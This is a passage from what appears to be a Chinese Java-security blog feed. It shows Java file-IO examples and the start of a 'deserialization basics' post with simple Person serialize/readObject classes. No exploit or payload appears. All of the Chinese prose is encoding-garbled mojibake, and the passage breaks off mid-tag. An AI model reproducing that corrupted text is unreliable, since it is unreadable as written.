class_">FileCopy</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>            copyFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">srcFilename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">String</span> <span class="hljs-variable">desFilename</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new2.txt&quot;</span>;  <br> <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(srcFilename);  <br> fileOutputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(desFilename);  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">while</span>((readLen = fileInputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>                fileOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>    &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                fileInputStream.close();  <br> fileOutputStream.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>        &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æ‹·è´æˆåŠŸï¼Œè¿™é‡Œä¸å†å±•ç¤º</p><h3 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h3><ul><li><code>FileReader</code> å°†ä¼šä¸€ä¸ªä¸€ä¸ª<strong>å­—ç¬¦</strong>è¯»å–ï¼Œå› æ­¤å¯ä»¥ä¸ä¹±ç è¾“å‡ºä¸­æ–‡</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InputStreamReader</span><br>ç”¨æ¥è¯»å–å­—ç¬¦æ–‡ä»¶çš„ä¾¿æ·ç±»ã€‚æ­¤ç±»çš„æ„é€ æ–¹æ³•å‡å®šé»˜è®¤å­—ç¬¦ç¼–ç å’Œé»˜è®¤å­—èŠ‚ç¼“å†²åŒºå¤§å°éƒ½æ˜¯é€‚å½“çš„ã€‚è¦è‡ªå·±æŒ‡å®šè¿™äº›å€¼ï¼Œå¯ä»¥å…ˆåœ¨ FileInputStream ä¸Šæ„é€ ä¸€ä¸ª InputStreamReaderã€‚<br>FileReader ç”¨äºè¯»å–å­—ç¬¦æµã€‚è¦è¯»å–åŸå§‹å­—èŠ‚æµï¼Œè¯·è€ƒè™‘ä½¿ç”¨ FileInputStreamã€‚<br></code></pre></td></tr></table></figure><p>ä¸‹æ–¹æµ‹è¯•ä»£ç å°†ä¼šå°† <code>Serialable/src/IOStream/CreateForFile/new1.txt</code> ä¸­çš„ new1.tx æ–‡ä»¶æ‰“å°è¾“å‡ºè‡³æ§åˆ¶å°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileReader;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// è¯»å–æ–‡ä»¶çš„å­—ç¬¦æµ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileReaderPrint</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        readFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">FileReader</span> <span class="hljs-variable">fileReader</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            fileReader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filePath);  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">char</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">8</span>];  <br> <span class="hljs-keyword">while</span> ((readLen = fileReader.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache, <span class="hljs-number">0</span>, readLen));  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                fileReader.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>é¡ºåˆ©è¾“å‡º</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a26.png"></p><p>åœ¨ä¹‹å‰åˆ©ç”¨å­—èŠ‚æµè¾“å‡ºçš„ä¸­æ–‡éƒ½æ˜¯ä¹±ç </p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://drun1baby.top/2022/05/30/Java-IO%E6%B5%81/">Java-IOæµ | Drunkbabyâ€™s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨-ååºåˆ—åŒ–åŸºç¡€</title>
    <link href="/2025/08/18/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/08/18/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-ååºåˆ—åŒ–åŸºç¡€"><a href="#Javaå®‰å…¨-ååºåˆ—åŒ–åŸºç¡€" class="headerlink" title="Javaå®‰å…¨-ååºåˆ—åŒ–åŸºç¡€"></a>Javaå®‰å…¨-ååºåˆ—åŒ–åŸºç¡€</h1><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><h3 id="1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#1-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="1. ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>1. ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h3><p>åºåˆ—åŒ–ï¼šå¯¹è±¡ -&gt; å­—ç¬¦ä¸²<br>ååºåˆ—åŒ–ï¼šå­—ç¬¦ä¸² -&gt; å¯¹è±¡</p><h3 id="2-ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#2-ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="2. ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>2. ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h3><p>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è®¾è®¡å°±æ˜¯ç”¨æ¥ä¼ è¾“æ•°æ®çš„ã€‚</p><p>å½“ä¸¤ä¸ªè¿›ç¨‹è¿›è¡Œé€šä¿¡çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡åºåˆ—åŒ–ååºåˆ—åŒ–æ¥è¿›è¡Œä¼ è¾“ã€‚</p><h4 id="åºåˆ—åŒ–çš„å¥½å¤„"><a href="#åºåˆ—åŒ–çš„å¥½å¤„" class="headerlink" title="åºåˆ—åŒ–çš„å¥½å¤„"></a>åºåˆ—åŒ–çš„å¥½å¤„</h4><p>(1) èƒ½å¤Ÿå®ç°æ•°æ®çš„æŒä¹…åŒ–ï¼Œé€šè¿‡åºåˆ—åŒ–å¯ä»¥æŠŠæ•°æ®æ°¸ä¹…çš„ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºé€šè¿‡åºåˆ—åŒ–å°†æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶ä¸­ã€‚</p><p>(2) åˆ©ç”¨åºåˆ—åŒ–å®ç°è¿œç¨‹é€šä¿¡ï¼Œåœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—ã€‚</p><h4 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åº”ç”¨çš„åœºæ™¯"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åº”ç”¨çš„åœºæ™¯" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åº”ç”¨çš„åœºæ™¯"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åº”ç”¨çš„åœºæ™¯</h4><p>(1) æƒ³æŠŠå†…å­˜ä¸­çš„å¯¹è±¡ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­æˆ–è€…æ˜¯æ•°æ®åº“å½“ä¸­ã€‚<br>(2) ç”¨å¥—æ¥å­—åœ¨ç½‘ç»œä¸Šä¼ è¾“å¯¹è±¡ã€‚<br>(3) é€šè¿‡ RMI ä¼ è¾“å¯¹è±¡çš„æ—¶å€™ã€‚</p><h4 id="å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"><a href="#å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®" class="headerlink" title="å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®"></a>å‡ ç§å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®</h4><p>XML&amp;SOAP<br>XML æ˜¯ä¸€ç§å¸¸ç”¨çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®ï¼Œå…·æœ‰è·¨æœºå™¨ï¼Œè·¨è¯­è¨€ç­‰ä¼˜ç‚¹ï¼ŒSOAPï¼ˆSimple Object Access protocolï¼‰ æ˜¯ä¸€ç§è¢«å¹¿æ³›åº”ç”¨çš„ï¼ŒåŸºäº XML ä¸ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–åè®®çš„ç»“æ„åŒ–æ¶ˆæ¯ä¼ é€’åè®®</p><p>JSONï¼ˆJavascript Object Notationï¼‰<br>Protobuf</p><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <span class="hljs-comment">// ä¿®æ”¹æˆè‡ªå·±çš„ Package è·¯å¾„</span><br>  <br><span class="hljs-keyword">import</span> java.io.Serializable;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> String name;  <br> <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;  <br>  <br>    &#125;  <br>    <span class="hljs-comment">// æ„é€ å‡½æ•°  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br> <span class="hljs-built_in">this</span>.age = age;  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +  <br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +  <br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +  <br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>SerializationTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectOutput;  <br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);  <br> System.out.println(person);  <br>  serialize(person);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>UnserializeTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> System.out.println(person);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ä»£ç è®²è§£"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ä»£ç è®²è§£" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ä»£ç è®²è§£"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ä»£ç è®²è§£</h3><ul><li><strong>SerializationTest.java</strong></li></ul><p>è¿™é‡Œæˆ‘ä»¬å°†ä»£ç è¿›è¡Œäº†å°è£…ï¼Œå°†åºåˆ—åŒ–åŠŸèƒ½å°è£…è¿›äº† <strong>serialize</strong> è¿™ä¸ªæ–¹æ³•é‡Œé¢ï¼Œåœ¨åºåˆ—åŒ–å½“ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ª <code>FileOutputStream</code> è¾“å‡ºæµå¯¹è±¡ï¼Œå°†åºåˆ—åŒ–çš„å¯¹è±¡è¾“å‡ºåˆ° <code>ser.bin</code> å½“ä¸­ã€‚å†è°ƒç”¨ oos çš„ <code>writeObject</code> æ–¹æ³•ï¼Œå°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br>oos.writeObject(obj);<br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šï¼Œåºåˆ—åŒ–æ•°æ®æ˜¯äºŒè¿›åˆ¶ï¼Œç›´æ¥ <code>System.out.println()</code> ä¼šæ˜¯ä¸€å †ä¸å¯è¯»å­—ç¬¦ã€‚<br>å¦‚æœæƒ³è¦çœ‹å¾—æ‡‚ï¼Œéœ€è¦è½¬æˆ Base64 æˆ– Hex å†æ‰“å°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos)) &#123;<br>            oos.writeObject(obj);<br>        &#125;<br>        <span class="hljs-comment">// æŠŠåºåˆ—åŒ–åçš„äºŒè¿›åˆ¶è½¬ Base64 æ–¹ä¾¿æ‰“å°</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64Data</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bos.toByteArray());<br>        System.out.println(<span class="hljs-string">&quot;åºåˆ—åŒ–åçš„ Base64 æ•°æ®ï¼š&quot;</span>);<br>        System.out.println(base64Data);<br><br>        <span class="hljs-comment">// åŒæ—¶ä¿å­˜åˆ°æ–‡ä»¶</span><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>)) &#123;<br>            fos.write(bos.toByteArray());<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        System.out.println(<span class="hljs-string">&quot;åŸå§‹å¯¹è±¡ï¼š&quot;</span> + person);<br>        serialize(person);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><strong>UnserializeTest.java</strong></li></ul><p>è¿›è¡Œååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br></code></pre></td></tr></table></figure><h3 id="Serializable-æ¥å£"><a href="#Serializable-æ¥å£" class="headerlink" title="Serializable æ¥å£"></a>Serializable æ¥å£</h3><p> åªæœ‰å®ç°äº†Serializableæˆ–è€…Externalizableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰èƒ½è¢«åºåˆ—åŒ–ä¸ºå­—èŠ‚åºåˆ—ã€‚ï¼ˆä¸æ˜¯åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ï¼‰ </p><p>Serializable æ¥å£æ˜¯ Java æä¾›çš„åºåˆ—åŒ–æ¥å£ï¼Œå®ƒæ˜¯ä¸€ä¸ªç©ºæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Serializable</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>Serializable ç”¨æ¥æ ‡è¯†å½“å‰ç±»å¯ä»¥è¢« ObjectOutputStream åºåˆ—åŒ–ï¼Œä»¥åŠè¢« ObjectInputStream ååºåˆ—åŒ–ã€‚</p><p>é€šè¿‡ ObjectOutputStream å°†éœ€è¦åºåˆ—åŒ–æ•°æ®å†™å…¥åˆ°æµä¸­ï¼Œå› ä¸º Java IO æ˜¯ä¸€ç§è£…é¥°è€…æ¨¡å¼ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ ObjectOutStream åŒ…è£… FileOutStream å°†æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­æˆ–è€…åŒ…è£… ByteArrayOutStream å°†æ•°æ®å†™å…¥åˆ°å†…å­˜ä¸­ã€‚åŒç†ï¼Œå¯ä»¥é€šè¿‡ ObjectInputStream å°†æ•°æ®ä»ç£ç›˜ FileInputStream æˆ–è€…å†…å­˜ ByteArrayInputStream è¯»å–å‡ºæ¥ç„¶åè½¬åŒ–ä¸ºæŒ‡å®šçš„å¯¹è±¡å³å¯ã€‚<br><img src="/img/java%E5%AE%89%E5%85%A8/a08.png"></p><h4 id="1-åºåˆ—åŒ–ç±»çš„å±æ€§æ²¡æœ‰å®ç°-Serializable-é‚£ä¹ˆåœ¨åºåˆ—åŒ–å°±ä¼šæŠ¥é”™"><a href="#1-åºåˆ—åŒ–ç±»çš„å±æ€§æ²¡æœ‰å®ç°-Serializable-é‚£ä¹ˆåœ¨åºåˆ—åŒ–å°±ä¼šæŠ¥é”™" class="headerlink" title="1. åºåˆ—åŒ–ç±»çš„å±æ€§æ²¡æœ‰å®ç° Serializable é‚£ä¹ˆåœ¨åºåˆ—åŒ–å°±ä¼šæŠ¥é”™"></a>1. åºåˆ—åŒ–ç±»çš„å±æ€§æ²¡æœ‰å®ç° Serializable é‚£ä¹ˆåœ¨åºåˆ—åŒ–å°±ä¼šæŠ¥é”™</h4><p>åœ¨Personç±»ä¸­åˆ å»æ­¤æ¥å£</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a09.png"></p><p>è¿è¡Œåºåˆ—åŒ–ä»£ç æ—¶å‘ç°æŠ¥é”™</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a10.png"></p><h4 id="2-åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå®ƒçš„çˆ¶ç±»å¦‚æœæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆå°†éœ€è¦æä¾›æ— å‚æ„é€ å‡½æ•°æ¥é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚"><a 